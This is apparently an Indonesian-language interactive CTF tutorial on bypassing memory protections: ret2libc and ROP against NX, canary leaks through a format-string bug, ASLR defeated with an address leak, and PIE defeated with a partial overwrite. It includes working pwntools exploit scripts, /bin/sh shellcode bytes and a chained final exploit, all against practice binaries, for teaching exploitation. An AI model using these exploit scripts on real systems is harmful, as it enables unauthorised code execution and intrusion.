Soal 1 — Bypass NX dengan ret2libc

Stack tidak executable — gunakan fungsi libc!

NX aktif: stack tidak bisa dieksekusi. Tapi kita masih bisa overflow dan overwrite return address — cukup arahkan ke system() di libc, bukan ke shellcode di stack!

Info program:
Buffer size = 64 byte, offset ke ret addr = 72 byte
NX: ENABLED | Canary: OFF | ASLR: OFF | PIE: OFF
Alamat dari libc (ASLR off, statis):
system() = 0xb7e52070
exit() = 0xb7e45f10
"/bin/sh" = 0xb7f6d4af (string di libc)

Susun payload ret2libc untuk eksekusi system("/bin/sh")!

Langkah 1 — Mengapa shellcode gagal dengan NX

NX menandai stack sebagai non-executable

Dulu: kita tulis shellcode ke stack, loncat ke sana → CPU eksekusi. Sekarang dengan NX:

# Tanpa NX: CPU eksekusi byte di stack — berhasil Stack: [shellcode bytes] ← CPU bisa eksekusi ini # Dengan NX: CPU TIDAK bisa eksekusi dari stack Stack: [shellcode bytes] ← SEGFAULT! Permission denied # OS menandai halaman stack sebagai R/W tapi NOT execute
Shellcode di stack tidak bisa dijalankan. Tapi... kita masih bisa loncat ke kode yang SUDAH ADA di memori — seperti fungsi di libc!
Ide ret2libc: loncat ke system() yang sudah ada di libc, dengan argumen "/bin/sh" yang juga sudah ada di libc!
Langkah 2 — Konsep ret2libc

Struktur calling convention x86 (32-bit)

Di x86 32-bit, saat fungsi dipanggil dengan call func:

arg1 ("/bin/sh" addr)esp+8
fake return address (exit())esp+4
→ system() address (overwrite ret addr ke sini)esp+0

Ketika CPU "memanggil" system() via ret, ia mengharapkan stack layout seperti di atas. Kita bisa fake stack layout ini melalui overflow!

Payload ret2libc: [PADDING 72 byte][addr system()][addr exit()][addr "/bin/sh"]
exit() dipakai sebagai "return address dari system()" supaya program tidak crash setelah shell ditutup. Bisa juga diisi 4 byte junk kalau tidak peduli crash.

Langkah 4 — Payload lengkap ret2libc

Gabungkan semua komponen

# ret2libc payload (84 byte): # Padding 72 byte b'A' * 72 # Overwrite return address → system() \x70\x20\xe5\xb7 # 0xb7e52070 (little-endian) # "Return address" dari system() → exit() \x10\x5f\xe4\xb7 # 0xb7e45f10 (little-endian) # Argument 1 untuk system() → "/bin/sh" \xaf\xd4\xf6\xb7 # 0xb7f6d4af (little-endian) # Python pwntools: from pwn import * p = process('./vuln') payload = b'A' * 72 payload += p32(0xb7e52070) # system() payload += p32(0xb7e45f10) # exit() payload += p32(0xb7f6d4af) # "/bin/sh" p.sendline(payload) p.interactive()
Tanpa satu byte shellcode pun — hanya alamat fungsi yang sudah ada di memori!
Langkah 5 — ROP (Return Oriented Programming) untuk kasus lebih complex

Kalau satu gadget tidak cukup — rantai gadget ROP

Untuk 64-bit atau kondisi lebih kompleks, kita perlu ROP gadget — potongan instruksi yang diakhiri ret.

# x86-64 calling convention: argumen lewat register (rdi, rsi, rdx) # Untuk system("/bin/sh"), butuh: rdi = addr "/bin/sh" # Cari gadget: "pop rdi; ret" di binary atau libc # ROP chain 64-bit: payload = b'A' * offset payload += p64(pop_rdi_ret) # gadget: pop rdi; ret payload += p64(binsh_addr) # nilai yang masuk ke rdi payload += p64(system_addr) # panggil system() payload += p64(exit_addr)
ROPgadget atau ropper dipakai untuk cari gadget. Konsep kunci: kita "rantai" gadget kecil untuk setup register sebelum memanggil fungsi.

Ringkasan Bypass NX

NX: stack tidak executable → tidak bisa taruh shellcode di stack

Soal 2 — Bypass Stack Canary

Baca nilai canary dulu, lalu overflow!

Canary aktif: nilai rahasia ditempatkan sebelum return address, kalau berubah program abort. Tapi program ini punya format string bug yang bisa dipakai untuk leak nilai canary!

void vuln() { char buf[32]; char fmt[64]; printf("Name: "); fgets(fmt, 64, stdin); printf(fmt); // ← format string bug! leak stack printf("Input: "); gets(buf); // ← buffer overflow }
Canary ada di offset ke-11 dari stack saat printf dipanggil
Offset ret addr dari buf: 40 byte (32 buf + 4 canary + 4 EBP)
Proteksi: Canary ON | NX: OFF | ASLR: OFF
Target: ret addr di 0x08048400 (win function)
1 / 6
Langkah 1 — Cara kerja stack canary

Canary = nilai rahasia yang dijaga sebelum return address

RETURN ADDRESS+40
saved EBP+36
CANARY VALUE (misal: 0xdeadbeef)+32
buf[0..31] — 32 byte buffer+0

Setelah fungsi selesai, compiler tambahkan kode cek:

; Kode yang compiler tambahkan di epilog fungsi: mov eax, [ebp-4] ; baca canary dari stack xor eax, gs:0x14 ; XOR dengan canary asli di TLS jne __stack_chk_fail ; kalau beda → ABORT!
Kalau overflow menimpa canary, program abort sebelum sempat sampai ke return address. Overflow biasa gagal.
Langkah 2 — Leak canary via format string

printf(fmt) tanpa format spec → baca isi stack!

Format string %p, %x, %s membaca argumen dari stack. Kalau tidak ada argumen, ia membaca nilai stack berikutnya — termasuk canary!

# Kirim sebagai input "Name": %p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p # Output yang mungkin: 0x1.(nil).0x804a000.0x1.0x1.0xbffff4a0. 0xbffff5b8.0x8048591.0x1.(nil).0xdeadbe00 # Nilai ke-11 = CANARY! # (posisi canary diketahui dari soal: offset ke-11)
Canary Linux selalu diakhiri dengan \x00 (null byte) untuk mencegah string leak — tapi kita bisa baca dengan %p yang tidak stop di null!
Dengan %11$p (direct parameter access), kita langsung baca parameter ke-11 tanpa print yang lain.
Langkah 3 — Parse nilai canary dari output

Ekstrak canary value dari respons server

from pwn import * p = process('./vuln') # Step 1: Kirim format string untuk leak canary p.recvuntil(b'Name: ') p.sendline(b'%11$p') # baca param ke-11 langsung # Step 2: Baca respons dan parse canary output = p.recvline() canary = int(output.strip(), 16) print(f"Canary: {hex(canary)}") # → Canary: 0xdeadbe00
Kita sekarang tahu nilai canary persis. Sekarang bisa overflow dengan memasukkan canary yang benar!
Langkah 4 — Susun payload dengan canary yang benar

Overflow tapi canary tidak berubah → cek canary lolos!

TARGET ADDR 0x08048400 (win func)+40
BBBB (fake EBP)+36
CANARY ASLI 0xdeadbe00 ← dipertahankan!+32

Langkah 5 — Teknik bypass canary lain: brute force di fork()

Server yang pakai fork() → canary sama di tiap child!

Server daemon yang pakai fork() untuk tiap koneksi punya celah: proses child mewarisi nilai canary dari parent. Canary tidak berubah antar koneksi!

# Strategi brute force canary di fork server: # Canary 4 byte = 4 × 256 = 1024 kemungkinan (byte pertama selalu \x00) # Brute force byte per byte: canary = b'\x00' # byte 1 selalu \x00 for b2 in range(256): # byte 2: 256 kemungkinan payload = b'A'*32 + canary + bytes([b2]) + b'\x00\x00' p = remote(host, port) p.send(payload) if b'crash' not in p.recv(): # tidak crash = byte benar canary += bytes([b2]) break
Total brute force: 3 × 256 = 768 request (byte 1 selalu \x00). Sangat feasible untuk server fork!

Ringkasan Bypass Canary

Bypass 1: Leak via format string → tulis kembali nilai aslinya

Bypass 2: Brute force byte-per-byte di server fork()

Payload: [buf fill][CANARY asli][fake EBP][target addr]

Soal 3 — Bypass ASLR

Alamat berubah tiap run — tapi ada yang bocor!

ASLR mengacak base address stack, heap, dan libc setiap eksekusi. Tapi program ini mencetak alamat sebuah variabel lokal — dan dari situ kita bisa hitung semua alamat lain!

void vuln() { char buf[64]; printf("buf is at: %p\n", buf); // ← leak alamat stack! gets(buf); }
Offset buf ke shellcode: 0 byte (shellcode di awal buf)
Offset buf ke ret addr: 72 byte
Proteksi: ASLR: ON | NX: OFF | Canary: OFF | PIE: OFF
Contoh output: buf is at: 0xbf92f3c0 (berubah tiap run!)
1 / 5
Langkah 1 — Cara kerja ASLR

Setiap run, base address berubah secara acak

# Tanpa ASLR: alamat selalu sama Run 1: buf at 0xbffff4a0, libc at 0xb7e00000 Run 2: buf at 0xbffff4a0, libc at 0xb7e00000 ← sama! # Dengan ASLR: base address berubah tiap run Run 1: buf at 0xbf92f3c0, libc at 0xb75a1000 Run 2: buf at 0xbfa8c240, libc at 0xb7612000 ← berbeda! Run 3: buf at 0xbfc01550, libc at 0xb7489000
Kita tidak bisa hardcode alamat — setiap run berbeda. Tapi: kalau program membocorkan SATU alamat, kita bisa hitung alamat lain karena OFFSET antar komponen selalu tetap!
Langkah 2 — Konsep relative offset

Offset antar alamat selalu konstan meski base berubah

Offset selalu tetap (tidak terpengaruh ASLR): ret_addr - buf_addr = 72 (konstan) libc_system - libc_base = 0x3a920 (konstan per versi libc) buf - stack_base = 0x3c0 (konstan per run environment)

Jadi kalau kita tahu buf_addr dari leak:

shellcode_addr = buf_addr + 0 (shellcode di awal buf) ret_addr_lokasi = buf_addr + 72
Dengan satu alamat yang bocor, kita bisa hitung posisi shellcode kita! Tidak perlu tahu base address ASLR sama sekali.
Langkah 3 — Baca leak dan hitung alamat target

Parse output "buf is at: 0x..." dari program

from pwn import * p = process('./vuln') # Step 1: Baca output yang berisi alamat buf line = p.recvline() # "buf is at: 0xbf92f3c0\n" buf_addr = int(line.split(b': ')[1], 16) print(f"buf @ {hex(buf_addr)}") # Step 2: Hitung alamat shellcode (di awal buf) shellcode_addr = buf_addr # shellcode kita taruh di awal! print(f"shellcode @ {hex(shellcode_addr)}")
buf_addr berbeda tiap run, tapi kita baca dulu sebelum kirim payload — jadi kita selalu tahu alamat yang benar!
Langkah 4 — Susun dan kirim payload

Payload sama seperti shellcode biasa, tapi return address dinamis

shellcode = ( b'\x31\xc0\x50\x68\x2f\x2f\x73\x68' b'\x68\x2f\x62\x69\x6e\x89\xe3\x31' b'\xc9\x31\xd2\xb0\x0b\xcd\x80' ) # 23 byte nop_count = 72 - len(shellcode) # = 49 byte NOP payload = shellcode payload += b'\x90' * nop_count # NOP padding payload += p32(shellcode_addr) # ← alamat DINAMIS dari leak! p.sendline(payload) p.interactive() # → Shell terbuka, meski ASLR aktif!

Soal 4 — Bypass PIE

Alamat kode program acak — tapi 12 bit bawah tidak berubah!

PIE mengacak base address program itu sendiri. Tapi ada teknik partial overwrite — kita hanya overwrite 1-2 byte terbawah return address untuk loncat ke fungsi lain dalam binary yang sama!

void win() { system("/bin/sh"); } // target! void vuln() { char buf[16]; read(0, buf, 32); // overflow 16 byte }
Offset ret addr: 24 byte dari buf
Proteksi: PIE: ON | ASLR: ON | NX: ON | Canary: OFF
win() di offset 0x???4a0 dari binary base (12 bit bawah = 0x4a0, tetap!)
vuln() ret addr saat ini (dari leak): 0x55555555...X dimana 12 bit bawah diketahui
1 / 5
Langkah 1 — Cara kerja PIE

PIE: bahkan alamat kode program itu sendiri berubah

# Tanpa PIE: semua fungsi di alamat tetap win() always at 0x08048400 vuln() always at 0x08048450 # Dengan PIE: base address binary berubah tiap run Run 1: base=0x55555555000, win() at 0x555555554400 Run 2: base=0x56781234000, win() at 0x567812344400 Run 3: base=0x7f4321ab000, win() at 0x7f4321ab4400

Tapi perhatikan satu hal krusial:

12 bit terbawah (3 nibble hex) TIDAK berubah! win() selalu berakhiran ...0x4a0 vuln() selalu berakhiran ...0x4e0 (offset dalam page 4KB selalu sama)
Kalau kita hanya overwrite 1 byte (atau 2 byte) terbawah return address, kita bisa arahkan ke win() tanpa tahu base address!
Langkah 2 — Teknik partial overwrite

Overwrite hanya 1-2 byte terbawah return address

Return address saat ini (misal): 0x55555555 04e8 (ret dari dalam vuln())

Target win() ada di: 0x55555555 04a0

Perbedaan hanya di 1 byte terakhir: 0xe8 → 0xa0

ret addr asli: 0x55555555 04 e8 ↓↓ win() offset: 0x55555555 04 a0 ↑↑ Hanya 1 byte yang berbeda! (0xe8 → 0xa0)
# Partial overwrite: hanya kirim 1 byte untuk ganti nibble terakhir payload = b'A' * 24 # padding ke ret addr payload += b'\xa0' # overwrite hanya 1 byte terbawah! # (read() membaca persis 25 byte, tidak null-terminate)
Partial overwrite hanya mungkin kalau ada 4 bit ambiguity (1 nibble = 16 kemungkinan). Probabilitas sukses: 1/16 = 6.25%. Tapi kalau bisa dikirim ulang, brute force cepat!
Langkah 3 — Bypass PIE dengan leak

Cara lebih reliable: leak satu alamat → hitung binary base

Kalau ada leak alamat fungsi/variabel di binary:

# Misal program print alamat main(): printf("main: %p\n", main); # Output: main: 0x555555554520 # Dari binary (readelf/objdump), main offset dari base: # main offset = 0x520 (12 bit bawah selalu tetap) binary_base = leaked_main - 0x520 win_addr = binary_base + 0x4a0 # offset win() dari base print(f"binary base: {hex(binary_base)}") print(f"win() at: {hex(win_addr)}")
Dengan binary base diketahui, kita bisa hitung alamat semua fungsi dalam binary — win(), gadget ROP, dll.
Langkah 4 — Payload partial overwrite

Susun payload dan kirim berulang sampai berhasil

from pwn import * while True: p = process('./vuln') # Partial overwrite: 24 byte padding + 1 byte overwrite payload = b'A' * 24 payload += b'\xa0' # target: offset win() = 0x?a0 p.send(payload) # pakai send bukan sendline (no newline!) try: p.recv(timeout=1) p.sendline(b'id') output = p.recv() if b'uid' in output: print("Shell!", output) p.interactive() break except: p.close() # crash → coba lagi
Probabilitas 1/16 per percobaan → rata-rata 8 percobaan. Untuk partial overwrite 2 byte: 1/256 → ~128 percobaan. Tetap feasible!

Langkah 1 — Rencana serangan (attack plan)

Tiga fase yang harus dilakukan berurutan

Fase 1: Leak canary + libc address
Kirim format string → %17$p untuk canary, %5$p untuk puts@libc
Fase 2: Hitung alamat target
libc_base = leaked_puts - puts_offset. Hitung system() dan "/bin/sh"
Fase 3: Kirim payload ret2libc + canary
[buf fill][canary][EBP][system()][exit()]["/bin/sh"]
Semua fase harus dalam SATU sesi koneksi — kalau terputus, canary dan alamat libc berubah!
Langkah 2 — Fase 1: Leak canary dan libc

Satu format string untuk dua leak sekaligus

from pwn import * p = process('./vuln') # Kirim format string untuk leak dua nilai sekaligus p.recvuntil(b'Enter name:\n') p.sendline(b'%5$p.%17$p') # %5$p = puts address di libc (bukan GOT, tapi sudah resolve) # %17$p = canary value leak = p.recvline().strip().split(b'.') puts_leak = int(leak[0], 16) canary = int(leak[1], 16) print(f"puts leak: {hex(puts_leak)}") print(f"canary: {hex(canary)}")
Dua nilai kritis sudah didapat dalam satu round-trip!
Langkah 3 — Fase 2: Hitung semua alamat

Dari satu leak → hitung system() dan "/bin/sh"

# Hitung libc base dari puts leak puts_offset = 0x067360 # offset puts dari libc base system_offset = 0x03a920 # offset system dari libc base binsh_offset = 0x15ba0b # offset "/bin/sh" dari libc base libc_base = puts_leak - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset exit_addr = libc_base + 0x02e9d0 # offset exit print(f"libc base: {hex(libc_base)}") print(f"system(): {hex(system_addr)}") print(f"/bin/sh: {hex(binsh_addr)}")
Offset tiap fungsi dari libc base TIDAK berubah meski ASLR aktif — hanya base-nya yang berubah. Ini yang membuat relative offset sangat powerful.
Langkah 4 — Fase 3: Susun payload final

Gabungkan bypass canary + ret2libc dalam satu payload

# Payload: buf(64) + canary(4) + EBP(4) + system + exit + binsh # Total = 64 + 4 + 4 + 4 + 4 + 4 = 84 byte p.recvuntil(b'Enter data:\n') payload = b'A' * 64 # isi buffer payload += p32(canary) # CANARY ASLI — tidak berubah! payload += b'B' * 4 # fake saved EBP payload += p32(system_addr) # ret2libc: system() payload += p32(exit_addr) # "return" dari system payload += p32(binsh_addr) # arg1: "/bin/sh" p.sendline(payload) p.interactive()
Satu payload, tiga bypass sekaligus: NX (ret2libc bukan shellcode), Canary (tulis canary asli), ASLR (alamat dari runtime leak)!

1. Cek proteksi aktif (checksec)

2. Cari vulnerability: overflow? format string? UAF?

3. Cari info leak: ada printf? ada fungsi yang print alamat?
